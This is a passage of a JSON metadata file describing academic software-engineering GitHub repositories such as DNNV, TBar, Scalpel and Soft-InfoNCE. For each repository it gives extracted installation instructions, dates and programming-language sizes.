                    "value": "Although we recommend to create Mappings / Fields with\nthe [Hawk Core Monitor UI](https://github.com/PrivacyEngineering/hawk-core-monitor), when using IaaC\nyou may want to specify the fields / mappings directly. On startup, this service will sync the\nupdates. You have many possibilities to provide such entities, as they are provided\nvia [Spring External Configuration](). The following things are described via. Environment variables.\nIf you want to use Properties, JSON, YAML etc., see there.\n```dotenv\nFIELDS_JSON='[\n    {\n        \"name\": \"user.email\",\n        \"description\": \"E-Mail address of the User\",\n        \"personalData\": false,\n        \"specialCategoryPersonalData\": false,\n        \"legalBases\": [\n            {\n                \"reference\": \"GDPR1\", \n                \"description\": \"\"\n            }\n        ]\n        \"legalRequirement\": false,\n        \"contractualRegulation\": false,\n        \"obligationToProvide\": false,\n        \"consequences\": \"\"\n    }\n]'\nMAPPINGS_JSON='[\n    {\n        endpointId: \"http:GET:user-service:/api/users\"\n        fields: [\n            {\n                field: \"user.email\",\n                side: \"SERVER\",\n                phase: \"RESPONSE\",\n                namespace: \"body\",\n                format: \"json\",\n                path: \"$.[*].email\"\n            }\n        ]\n    }\n]'\n```\nIt is also possible insert those values one by one by using:\nBASH2*\n \n",
                    "original_header": "Mapping / Field import from JSON"
                },
                "confidence": 0.9999999772056756,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/PrivacyEngineering/hawk-service/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-16T17:49:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-07-18T09:09:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 87747
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "586": {
        "filename": "pkuserc_MPCos_ASE2022_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/pkuserc/MPCos_ASE2022",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-09-03T14:36:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-19T08:16:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 17547
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "587": {
        "filename": "hussien89aa_MigrationMiner_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hussien89aa/MigrationMiner",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "* First you need to build the dataset, by running the following script Database/MigrationMinerDBSQL.sql.\nOpen a terminal and run the following commands\n```sql\n mysql -u root -p\n source ./MigrationMinerDBSQL.sql\n```\nAfter running the commands, the database should be created with all tables and views.\n\n* Open eclipse IDE then go to File-> import-> Maven-> existing Maven Projects-> Select MigrationMiner directory.\n* Set your local MYSQL username and password in this file [DatabaseLogin.java](https://github.com/hussien89aa/MigrationMiner/blob/master/MigrationMiner/src/main/java/com/project/settings/DatabaseLogin.java).\n* Update MigrationMiner/data/gitRepositories.csv with the list of git repositories that you want to use as input (they will be searched for potential library migrations).\n* Go to your github account under Settings > Developer Settings > Personal Access Tokens, add new token. Use token to set your GitHub token in this file [GithubLogin.java](https://github.com/hussien89aa/MigrationMiner/blob/master/MigrationMiner/src/main/java/com/project/settings/GithubLogin.java). Your token will be used so that Migration Miner can search a large number of GitHub projects without authentication issues.\n* (Optional) We print alot of logs, to avoid console buffer overflow. In eclipse IDE go to   preferences-> console-> limit console buffer size to small number such as 10000.\n* Run the [Main.java](https://github.com/hussien89aa/MigrationMiner/blob/master/MigrationMiner/src/main/java/com/main/parse/Main.java).\n\n",
                    "type": "Text_excerpt",
                    "original_header": "B- Using the following steps",
                    "parent_header": [
                        "How to install and run the tool"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/hussien89aa/MigrationMiner/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-05-06T04:44:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-15T14:51:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 216061
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "588": {
        "filename": "plasma-umass_slipcover_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/plasma-umass/slipcover",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Our GitHub workflows run the automated test suite on Linux, MacOS and Windows, but\nreally it should work anywhere where CPython/PyPy does.\n \n",
                    "original_header": "Platforms"
                },
                "confidence": 0.979415627256443,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/plasma-umass/slipcover/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-11-03T20:26:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T12:23:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 273599
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 10063
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 1663
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "589": {
        "filename": "dlshriver_DNNV_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dlshriver/dnnv",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "\r\nDNNV requires python >=3.7,<3.10, and has been tested on linux. To install the latest stable version run:\r\n\r\n```bash\r\n$ pip install dnnv\r\n```\r\n\r\nor\r\n\r\n```bash\r\n$ pip install git+https://github.com/dlshriver/DNNV.git@main\r\n```\r\n\r\nWe recommend installing DNNV into a [python virtual environment](https://docs.python.org/3/tutorial/venv.html).\r\n\r\nInstall any of the supported verifiers ([Reluplex](https://github.com/guykatzz/ReluplexCav2017), [planet](https://github.com/progirep/planet), [MIPVerify.jl](https://github.com/vtjeng/MIPVerify.jl), [Neurify](https://github.com/tcwangshiqi-columbia/Neurify), [ERAN](https://github.com/eth-sri/eran), [BaB](https://github.com/oval-group/PLNN-verification), [marabou](https://github.com/NeuralNetworkVerification/Marabou), [nnenum](https://github.com/stanleybak/nnenum), [verinet](https://vas.doc.ic.ac.uk/software/neural/)):\r\n\r\n```bash\r\n$ dnnv_manage install reluplex planet mipverify neurify eran bab marabou nnenum verinet\r\n```\r\n\r\n*Several verifiers make use of the [Gurobi solver](https://www.gurobi.com/).* This should be installed automatically, but requires a license to be manually activated and available on the host machine. Academic licenses can be obtained for free from the [Gurobi website](https://user.gurobi.com/download/licenses/free-academic).\r\n\r\n> After installing a verifier that requires Gurobi, the grbgetkey command can be found at `.venv/opt/gurobi912/linux64/bin/grbgetkey`.\r\n\r",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Deep Neural Network Verification",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dlshriver/DNNV/main/README.md"
            },
            {
                "result": {
                    "value": "\r\nFirst create and activate a python virtual environment.\r\n\r\n```bash\r\n$ python -m venv .venv\r\n$ . .venv/bin/activate\r\n```\r\n\r\nThen run the following commands to clone DNNV and install it into the virtual environment:\r\n\r\n```bash\r\n$ git clone https://github.com/dlshriver/DNNV.git\r\n$ cd DNNV\r\n$ pip install .\r\n```\r\n\r\nVerifiers can then be installed using the `dnnv_manage` tool as described above.\r\n\r\n**Make sure that the project environment is activated** when using dnnv or the dnnv_manage tools.\r\n\r",
                    "type": "Text_excerpt",
                    "original_header": "Source Installation",
                    "parent_header": [
                        "Deep Neural Network Verification",
                        "Getting Started",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dlshriver/DNNV/main/README.md"
            },
            {
                "result": {
                    "value": "\r\nWe provide a docker image with DNNV and all non-Gurobi dependent verifiers. To obtain and use the latest pre-built image of the main branch, run:\r\n\r\n```bash\r\n$ docker pull dlshriver/dnnv:latest\r\n$ docker run --rm -it dlshriver/dnnv:latest\r\n(.venv) dnnv@hostname:~$ dnnv -h\r\n```\r\n\r\nThe latest version of the develop branch is available as `dlshriver/dnnv:develop`, and tagged releases are available as `dlshriver/dnnv:vX.X.X` where `vX.X.X` is the desired version number.\r\n\r\nThe docker image can also be built using the provided Dockerfile. The provided build file will install DNNV with all of the verifiers that do not require Gurobi. To build and run the docker image, run:\r\n\r\n```bash\r\n$ docker build . -t dlshriver/dnnv\r\n$ docker run --rm -it dlshriver/dnnv\r\n(.venv) dnnv@hostname:~$ dnnv -h\r\n```\r\n\r",
                    "type": "Text_excerpt",
                    "original_header": "Docker Installation",
                    "parent_header": [
                        "Deep Neural Network Verification",
                        "Getting Started",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dlshriver/DNNV/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-12-12T18:27:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-25T15:46:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1394545
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1897
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1326
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "590": {
        "filename": "ideas-labo_DaL_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ideas-labo/DaL",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Download all the files into the same folder/clone the repository.\n\n2. Install the specified version of Python and Tensorflow:\nthe codes have been tested with **Python 3.6 - 3.9** and **Tensorflow 2.x**, other versions might cause errors.\n\n3. Install all missing packages according to **requirements.txt** and runtime messages.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Prerequisites and Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ideas-labo/DaL/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To run more complicated experiments, alter the codes following the instructions below and comments in *DaL_main.py*.\n \n",
                    "original_header": "Change Experiment Settings"
                },
                "confidence": 0.9990559765500389,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ideas-labo/DaL/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-06-02T08:03:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-15T05:46:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 61789
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "591": {
        "filename": "SMAT-Lab_Scalpel_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SMAT-Lab/Scalpel",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Install Scalpel using pip with the following command\n\n```sh\npip install python-scalpel\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/SMAT-Lab/Scalpel/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img src=\"https://github.com/SMAT-Lab/Scalpel/blob/main/docs/source/_static/resources/Scalpel.svg\" width=\"550\">\n \n",
                    "original_header": "Scalpel: The Python Static Analysis Framework"
                },
                "confidence": 0.9998267047627164,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SMAT-Lab/Scalpel/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-19T23:14:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-26T01:17:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 10277174
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 5398
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 889
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "592": {
        "filename": "SerVal-DTF_TBar_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/TruX-DTF/TBar",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "---------------------------\n 1. Download and Install Defects4J.\n - `./installD4J.sh`\n \n 2. Check out and compile each bug.\n - `./checkoutD4JBugs.sh`\n    \n  If you fail to install defects4j, checkout or compile defects4j bugs, please reference these [introductions](https://github.com/rjust/defects4j#steps-to-set-up-defects4j).\n \n  The docker image of TBar is available: [TBar](https://cloud.docker.com/u/kuiliu/repository/docker/kuiliu/tbar).\n  \n IV. Run TBar\n ------------\n 1. Fixing Defects4J bugs with perfect fault localization configuration.\n - `./PerfectFLTBarRunner.sh <Bug_Data_Path> <Bug_ID> <defects4j_Home> <true/false>`\n    \n    Example: `./PerfectFLTBarRunner.sh D4J/projects/ Chart_8 D4J/defects4j/ false` to fix bug Chart_8 with perfect fault localization configuration.\n    \n    `./PerfectFLTBarRunner.sh D4J/projects/ Chart_8 D4J/defects4j/ true` tries to fix bug Chart_8 with all possible matching fix patterns.\n \n 2. Fixing Defects4J bugs with normal fault localization configuration.\n - `./NormalFLTBarRunner.sh <Bug_Data_Path> <Bug_ID> <defects4j_Home>`\n   \n   Example: `./NormalFLTBarRunner.sh D4J/projects/ Chart_8 D4J/defects4j/`. \n \n If it executes failed because of the paths of <Bug_Data_Path> and <defects4j_Home>, please use their absolute paths.\n \n \n V. Structure of the Directories\n -------------------------------\n ```powershell\n  |--- README.md               :  user guidance\n  |--- D4J                     :  Defects4J information\n  |--- FailedTestCases         :  Failed test cases of each Defects4J bug\n  |--- lib                     :  GZoltar jar files\n  |--- Results                 :  Generated patches\n  |------ FixPatterns          :  Bugs fixed by each fix pattern\n  |------ PerfectFL            :  Bugs fixed with perfect fault localization configuration\n  |------ NormalFL             :  Bugs fixed with normal fault localization configuration\n  |--- src                     :  source code\n  |--- SuspiciousCodePositions :  Bug positions localized with GZoltar\n  |--- target                  :  binary code\n```\n\n----\n\n__ALL__ suggestions are welcomed.\n",
                    "type": "Text_excerpt",
                    "original_header": "III. Prepare Defects4J Bugs",
                    "parent_header": [
                        "TBar"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/SerVal-DTF/TBar/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-03-20T08:30:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-28T02:35:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 546894
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2141
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "593": {
        "filename": "serjtroshin_probings4code_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/serjtroshin/probings4code",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- `git clone https://github.com/serjtroshin/probings4code`\n- `cd probings4code`\n- go to [link](https://mega.nz/file/3FtkQa6C#y-TLNFNfkrLvC7sY9QeCqrnIZo7FugMEHqPrwtKCJRU) and download the data\n- `unzip -l CodeAnalysis.zip`\n  \nThe script was run on `CentOS Linux 7`, `Python 3.9.2`.\nCreate a conda environment for the project and install requirements:\n- `conda create -n probings4code python=3.9.12`\n- `conda activate probings4code`\n- `conda install pytorch==1.11.0 torchvision==0.12.0 cudatoolkit=11.6 numpy=1.22.3 -c pytorch -y`\n- `pip install -r requirements.txt` \nInstall tree-sitter parser for `python` and `java` by running \n-  `bash build.sh`\n \n",
                    "original_header": "Repository Environment"
                },
                "confidence": 0.999996329510332,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/serjtroshin/probings4code/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To prepare data for the tasks run and create `train`, `test` splits: \n- `bash generate_synt_data.sh` \nThe script will output `all.json` file with train/test splits `train.json`, `test.json` in the following subfolders in CodeAnalysis directory: `identity`,`undeclared`, `dfg`, `identname`,  `varmisuse`, `readability`, `algo`. \nTo prepare data for ablation study (Appendix) run:\n- `bash prepare_ablation.sh`\n \n",
                    "original_header": "Data preprocessing"
                },
                "confidence": 0.9754767332370665,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/serjtroshin/probings4code/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To save embeddings from all layers for all tasks use \n- `bash save_embeddings.sh`.  \nThe script will save embeddings to the `data_all.pkz` in the `CodeAnalysis` subfolders. \n",
                    "original_header": "Saving embedding to disk"
                },
                "confidence": 0.945237940962891,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/serjtroshin/probings4code/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-03T13:55:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-27T16:15:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 365167
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2019
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "594": {
        "filename": "icse2023preich_testability-refactoring-patterns_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/icse2023preich/testability-refactoring-patterns",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\nWe take new_pullreq.csv from https://yuyue.github.io/res/paper/newPR_MSR2020.pdf, in particular from https://github.com/zhangxunhui/new_pullreq_msr2020 and further from https://zenodo.org/record/3922907/files/new_pullreq.csv?download=1 (2.2gb) as a source of PRs from which we derive a set of projects (together with projects from organization.csv and historical_projects.csv, which we abandon later). \n"
                },
                "confidence": 0.9999584271101727,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/icse2023preich/testability-refactoring-patterns/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-19T06:37:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-05-23T13:27:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 72647
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 27230
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 7135
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "595": {
        "filename": "AndroidAutoUpdate_AutoUpdate_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/AndroidAutoUpdate/AutoUpdate",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-05-06T12:56:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-11T12:32:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 139410
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4828
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "596": {
        "filename": "Alex-HaochenLi_Soft-InfoNCE_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Alex-HaochenLi/Soft-InfoNCE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "In the paper we mention three approaches to estimate the weight term, BM25, SimCSE, and trained models.\nFor BM25, it is a built-in function. However, for learning-based SimCSE and trained models, you need to train them first.\n",
                    "type": "Text_excerpt",
                    "original_header": "Preparation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Alex-HaochenLi/Soft-InfoNCE/master/README.md"
            },
            {
                "result": {
                    "value": "To train the unsupervised SimCSE, run:\n```angular2html\npython nl_simcse.py \\\n--output_dir ./saved_models/SimCSE \\\n--root_path ./data/ \\\n--train_batch_size 256 \\\n--num_train_epochs 10  \\\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "SimCSE",
                    "parent_header": [
                        "Preparation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Alex-HaochenLi/Soft-InfoNCE/master/README.md"
            },
            {
                "result": {
                    "value": "To train the CodeBERT with InfoNCE loss, run:\n```angular2html\nlang=python\nsave_dir=trained-codebert-${lang}\npython run_siamese_test.py \\\n--model_type roberta \\\n--do_train \\\n--do_eval \\\n--evaluate_during_training \\\n--eval_all_checkpoints \\\n--data_dir ./data/ \\\n--train_data_file train.jsonl \\\n--code_type code \\\n--max_seq_length 200 \\\n--per_gpu_train_batch_size 32 \\\n--per_gpu_retrieval_batch_size 100 \\\n--learning_rate 1e-6 \\\n--num_train_epochs 10 \\\n--gradient_accumulation_steps 1 \\\n--output_dir ./model/${save_dir} \\\n--encoder_name_or_path microsoft/codebert-base \\\n--lang ${lang} \\\n--infonce\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "CodeBERT",
                    "parent_header": [
                        "Preparation",
                        "Trained Models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Alex-HaochenLi/Soft-InfoNCE/master/README.md"
            },
            {
                "result": {
                    "value": "To train the GraphCodeBERT with InfoNCE loss, run:\n```angular2html\nlang=python\nsave_dir=trained-graphcodebert-${lang}\npython run.py \\\n--output_dir=./saved_models/${save_dir} \\\n--config_name=microsoft/graphcodebert-base \\\n--model_name_or_path=microsoft/graphcodebert-base \\\n--tokenizer_name=microsoft/graphcodebert-base \\\n--lang=${lang} \\\n--do_train \\\n--do_eval \\\n--train_data_file=./data/${lang}/train.jsonl \\\n--eval_data_file=./data/${lang}/valid.jsonl \\\n--test_data_file=./data/${lang}/test.jsonl \\\n--codebase_file=./data/${lang}/codebase.jsonl \\\n--num_train_epochs 30 \\\n--code_length 256 \\\n--data_flow_length 64 \\\n--nl_length 128 \\\n--train_batch_size 32 \\\n--eval_batch_size 64 \\\n--learning_rate 2e-5 \\\n--seed 123456 \\\n--infonce\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "GraphCodeBERT",
                    "parent_header": [
                        "Preparation",
                        "Trained Models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Alex-HaochenLi/Soft-InfoNCE/master/README.md"
            },
            {
                "result": {
                    "value": "To train the UniXCoder with InfoNCE loss, run:\n```angular2html\nlang=python\nsave_dir=trained-unixcoder-${lang}\npython run.py \\\n--output_dir ./saved_models/${save_dir} \\\n--model_name_or_path microsoft/unixcoder-base \\\n--do_train \\\n--do_eval \\\n--train_data_file ./data/${lang}/train.jsonl \\\n--eval_data_file ./data/${lang}/test.jsonl \\\n--codebase_file ./data/${lang}/codebase.jsonl \\\n--num_train_epochs 10 \\\n--code_length 256 \\\n--nl_length 128 \\\n--train_batch_size 64 \\\n--eval_batch_size 64 \\\n--learning_rate 2e-5 \\\n--seed 123456 \\\n--infonce\n```\nNote that for the simplicity of reproduction, we will directly upload the parameters of the above-mentioned models directly\nonce the paper is accepted.\n",
                    "type": "Text_excerpt",
                    "original_header": "UniXCoder",
                    "parent_header": [
                        "Preparation",
                        "Trained Models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Alex-HaochenLi/Soft-InfoNCE/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\nconda create -n softinfonce python=3.6 -y\nconda activate softinfonce\nconda install pytorch-gpu=1.7.1 -y\npip install transformers==4.18.0 scikit-learn nltk==3.6.1 tensorboardX tqdm more_itertools pytrec_eval elasticsearch tree_sitter\n```\n \n",
                    "original_header": "Environment"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Alex-HaochenLi/Soft-InfoNCE/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-10-09T07:09:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T02:13:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 169441
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 430
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "597": {
        "filename": "tudelft-cda-lab_FlexFringe_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tudelft-cda-lab/FlexFringe",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
